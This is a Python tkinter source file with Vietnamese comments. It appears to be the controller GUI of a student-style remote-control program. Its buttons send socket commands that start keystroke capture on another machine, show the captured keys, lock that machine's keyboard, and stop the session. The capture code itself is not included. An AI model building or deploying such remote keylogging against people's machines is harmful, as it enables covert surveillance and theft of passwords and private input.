import tkinter as tk
from tkinter import *
from tkinter import Text
from DC_Constant import BACKGROUND, BUFFERSIZE, WIDTH, HEIGHT, FORMAT, myButton

class Keylogger(Frame):
    def __init__(self, window, main_connect):
        Frame.__init__(self, window)
        self.configure(
            bg=BACKGROUND,
            height=HEIGHT,
            width=WIDTH,
            bd=0,
            highlightthickness=0,
            relief="ridge",
        )
        window.geometry("900x500+200+200")
        self.grid(row=0, column=0, sticky="nsew")

        self.main_connect=main_connect
        self.status=True
        
        self.box = Text(
            self,
            height=200,
            width=500,
            state="disable",
            wrap="char",
            font=("Times New Roman",15),
            bg="white",
            bd=0,
            highlightthickness=0,
        )
        self.box.place(x=200, y=29, width=500, height=360)

        self.button_bind = myButton(self)
        self.button_bind.configure(text="BIND", command=lambda: self.bind(main_connect, self.button_bind))
        self.button_bind.place(x=733, y=113, width=135, height=53.0)

        self.button_lock = myButton(self)
        self.button_lock.configure(text="LOCK", command=lambda: self.lock(main_connect, self.button_lock))
        self.button_lock.place(x=733, y=250, width=135, height=53)

        self.button_show = myButton(self)
        self.button_show.configure(text="SHOW", command=lambda: self.show(main_connect, self.box))
        self.button_show.place(x=32, y=113, width=135, height=53)

        self.button_delete = myButton(self)
        self.button_delete.configure(text="DELETE", command=lambda: self.delete(self.box))
        self.button_delete.place(x=32, y=250, width=135, height=53)

        self.button_back = myButton(self)
        self.button_back.configure(text="BACK", command=lambda:self.back())
        self.button_back.place(x=382, y=418, width=135, height=53)

    #Ấn nút lắng nghe chuyển đổi giữa BIND và UNBIND
    def bind(self, main_connect, button):
        main_connect.sendall("BIND".encode(FORMAT))
        if button["text"] == "BIND":
            button.configure(text="UNBIND")
        else:
            button.configure(text="BIND")
        return

    #Hiện những nút đã ấn bên Server
    def show(self, main_connect, textbox):
        main_connect.sendall("SHOW".encode(FORMAT))
        #Nhận dữ liệu các nút đã ấn bên Server
        data = main_connect.recv(BUFFERSIZE).decode(FORMAT)
        #Điền dữ liệu vào bảng thông tin bắt đầu từ vị tri cuối
        textbox.config(state="normal")
        textbox.insert(tk.END, data)
        textbox.config(state="disable")
        return

    #Xóa dữ liệu trên bảng thông tin từ vị trí bắt đầu đến cuối
    def delete(self, textbox):
        textbox.config(state="normal")
        textbox.delete("1.0", "end")
        textbox.config(state="disable")
        return

    #Khóa bàn phím bên Client
    def lock(self, main_connect, button):
        main_connect.sendall("LOCK".encode(FORMAT))
        if button["text"] == "LOCK":
            button.configure(text="UNLOCK")
        else:
            button.configure(text="LOCK")
        return

    #Trở lại màn hình Menu
    def back(self):
        self.status = False
        self.destroy()
        self.main_connect.sendall("STOP".encode())
        return